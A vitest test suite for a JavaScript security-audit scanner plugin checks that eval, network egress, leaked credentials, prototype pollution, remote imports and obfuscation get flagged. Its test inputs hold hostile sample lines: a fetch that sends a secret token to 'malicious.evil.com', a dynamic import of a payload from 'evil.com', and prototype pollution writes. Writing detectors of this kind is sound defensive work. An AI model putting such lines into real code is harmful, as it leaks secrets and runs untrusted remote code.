import { describe, expect, it } from 'vitest'
import { Context } from 'cordis'
import { apply, scanCode } from './index.js'

describe('SecurityAuditPlugin & scanner', () => {
  it('passes benign clean code', () => {
    const code = `
      export function playSong(id) {
        const url = 'https://api.example.com/tracks/' + id;
        return fetch(url).then(r => r.json());
      }
    `
    const report = scanCode(code, { allowedHosts: ['api.example.com'] })
    expect(report.level).toBe('pass')
    expect(report.findings).toHaveLength(0)
  })

  it('warns (not blocks) on eval', () => {
    const code = `
      function run(data) {
        return eval(data);
      }
    `
    const report = scanCode(code)
    expect(report.level).toBe('warn')
    expect(report.findings.some((f) => f.ruleId === 'eval-function-constructor')).toBe(true)
  })

  it('warns (not blocks) on the new Function constructor', () => {
    const code = `
      const fn = new Function('a', 'b', 'return a + b');
    `
    const report = scanCode(code)
    expect(report.level).toBe('warn')
    expect(report.findings.some((f) => f.ruleId === 'eval-function-constructor')).toBe(true)
  })

  it('warns (not blocks) on dynamic timer code execution and vm breakout', () => {
    const timerCode = `setTimeout("doBadThings()", 500);`
    const reportTimer = scanCode(timerCode)
    expect(reportTimer.level).toBe('warn')
    expect(reportTimer.findings.some((f) => f.ruleId === 'dynamic-code-execution')).toBe(true)

    const vmCode = `const vm = require('vm'); vm.runInThisContext('code');`
    const reportVm = scanCode(vmCode)
    expect(reportVm.level).toBe('warn')
    expect(reportVm.findings.some((f) => f.ruleId === 'dynamic-code-execution')).toBe(true)
  })

  it('warns (not blocks) on undeclared host network egress, allows declared hosts', () => {
    const code = `
      fetch('https://malicious.evil.com/exfiltrate?token=' + secret);
      fetch('https://api.legit.com/data');
    `
    // Only api.legit.com is allowed
    const report = scanCode(code, { allowedHosts: ['api.legit.com'] })
    expect(report.level).toBe('warn')
    const hostFindings = report.findings.filter((f) => f.ruleId === 'undeclared-host-egress')
    expect(hostFindings).toHaveLength(1)
    expect(hostFindings[0]?.message).toContain('malicious.evil.com')
  })

  it('supports wildcard allowedHosts (*.domain.com)', () => {
    const code = `
      fetch('https://sub.cdn.example.org/audio.mp3');
    `
    const report = scanCode(code, { allowedHosts: ['*.example.org'] })
    expect(report.level).toBe('pass')
  })

  it('flags hardcoded private keys and API tokens as block', () => {
    const privKeyCode = `
      const key = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA0...";
    `
    const reportPriv = scanCode(privKeyCode)
    expect(reportPriv.level).toBe('block')
    expect(reportPriv.findings.some((f) => f.ruleId === 'credential-private-key')).toBe(true)

    const tokenCode = `
      const ghToken = "ghp_123456789012345678901234567890123456";
    `
    const reportToken = scanCode(tokenCode)
    expect(reportToken.level).toBe('block')
    expect(reportToken.findings.some((f) => f.ruleId === 'credential-api-token')).toBe(true)
  })

  it('warns (not blocks) on prototype pollution vectors', () => {
    const protoCode = `
      obj.__proto__.polluted = true;
    `
    const reportProto = scanCode(protoCode)
    expect(reportProto.level).toBe('warn')
    expect(reportProto.findings.some((f) => f.ruleId === 'prototype-pollution')).toBe(true)

    const ctorCode = `
      function hook() {
        Object.prototype['admin'] = true;
      }
    `
    const reportCtor = scanCode(ctorCode)
    expect(reportCtor.level).toBe('warn')
    expect(reportCtor.findings.some((f) => f.ruleId === 'prototype-pollution')).toBe(true)
  })

  it('flags remote dynamic import() as block', () => {
    const code = `
      const remoteMod = await import('https://evil.com/payload.js');
    `
    const report = scanCode(code)
    expect(report.level).toBe('block')
    expect(report.findings.some((f) => f.ruleId === 'remote-dynamic-import')).toBe(true)
  })

  it('warns (not blocks) on obfuscation features (dense hex and packer)', () => {
    const denseHexCode = `
      const msg = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64";
    `
    const reportHex = scanCode(denseHexCode)
    expect(reportHex.level).toBe('warn')
    expect(reportHex.findings.some((f) => f.ruleId === 'obfuscation-dense-hex')).toBe(true)

    const packerCode = `
      eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0',1,1,'a'.split('|'),0,{}))
    `
    const reportPacker = scanCode(packerCode)
    expect(reportPacker.level).toBe('warn')
    expect(reportPacker.findings.some((f) => f.ruleId === 'obfuscation-packer')).toBe(true)
  })

  it('detects high entropy strings as warn', () => {
    // 64 random characters Base64 with high Shannon entropy
    const highEntropyCode = `
      const secret = "a9BfK3mQxZ8vL2wYp0jN7hG4rD1sC6tU8eI5oP4yT1vX3zQ7mW8bV0cL9kH2jF5d";
    `
    const report = scanCode(highEntropyCode)
    expect(report.level).toBe('warn')
    expect(report.findings.some((f) => f.ruleId === 'high-entropy-string')).toBe(true)
  })

  it('warns (not blocks) on URL string constants outside network-call positions', () => {
    // Bundled artifacts carry URL *data* (namespaces, mirror defaults,
    // doc examples) that is never requested. Only a URL literal handed
    // straight to a network API is an egress attempt.
    const code = `
      const SVG_NS = 'http://www.w3.org/2000/svg';
      const MIRROR = 'https://registry.npmmirror.com';
      export const ns = SVG_NS + MIRROR;
    `
    const report = scanCode(code)
    expect(report.level).toBe('warn')
    expect(report.findings.every((f) => f.level === 'warn')).toBe(true)
    expect(report.findings.some((f) => f.ruleId === 'undeclared-host-egress')).toBe(true)
  })

  it('does not block read-only prototype-chain walks, warns on pollution writes', () => {
    const walkCode = `
      function isInstanceOf(instance, cls) {
        let ctor = instance.constructor;
        while (ctor) {
          ctor = ctor.prototype?.constructor;
          if (ctor === cls) return true;
        }
        return false;
      }
    `
    expect(scanCode(walkCode).level).toBe('pass')

    const writeCode = `x.constructor.prototype.polluted = true;`
    const reportWrite = scanCode(writeCode)
    expect(reportWrite.level).toBe('warn')
    expect(reportWrite.findings.some((f) => f.ruleId === 'prototype-pollution')).toBe(true)
  })

  it('judges hex escapes by density, so large bundles warn instead of blocking', () => {
    const sparse = `const sep = '\\xB7';\n` + `// ${'bundled library padding '.repeat(600)}\n` +
      Array.from({ length: 10 }, (_, i) => `const s${i} = '\\xB7';`).join('\n')
    const reportSparse = scanCode(sparse)
    expect(reportSparse.level).toBe('warn')
    expect(reportSparse.findings.some((f) => f.ruleId === 'obfuscation-dense-hex')).toBe(true)
  })

  it('registers and provides ctx.securityAudit service via Cordis DI', async () => {
    const ctx = new Context()
    await apply(ctx)

    expect(ctx.securityAudit).toBeDefined()
    const report = ctx.securityAudit.scan('eval("1+1")', {})
    expect(report.level).toBe('warn')
  })
})
